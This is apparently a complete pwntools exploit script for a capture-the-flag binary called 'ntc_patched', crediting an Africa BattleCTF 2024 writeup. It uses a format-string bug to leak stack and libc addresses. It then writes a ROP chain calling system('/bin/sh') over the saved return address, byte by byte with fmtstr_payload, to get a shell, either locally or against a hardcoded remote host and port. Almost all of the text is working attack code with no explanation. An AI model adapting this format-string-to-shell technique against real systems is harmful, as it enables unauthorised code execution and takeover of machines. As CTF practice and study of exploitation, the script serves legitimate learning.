#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './ntc_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *main+163
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================

def exploit():
    global io
    #Reference https://github.com/Lobsterge/CTF-Writeups/blob/main/Africa%20BattleCTF%202024/NTcrack/source/solve.py
    io = initialize()
    #Leak stack and libc
    io.sendline("%76$p %72$p")
    io.recvuntil("Entrez le hash NTLM : ")
    leak = io.recvline().decode().split(" ")
    stack = int(leak[0], 16)
    ret = stack - 0x7b0 #Calculate by break at ret
    stdout = int(leak[1], 16)
    libc.address = stdout - libc.sym._IO_2_1_stdout_
    log.info("Stdout: %#x", stdout)
    log.info("Libc base: %#x", libc.address)
    log.info("Stack leak: %#x", stack)
    log.info("Stack ret: %#x", ret)

    #Getting shell
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.system(next(libc.search("/bin/sh\0")))
    payload = rop.chain()
    for i in range(len(payload)):
        writes = {ret+i:payload[i]}
        io.sendline(fmtstr_payload(6, writes, write_size='byte'))
    io.sendline("")
    io.interactive()
    
if __name__ == '__main__':
    exploit()
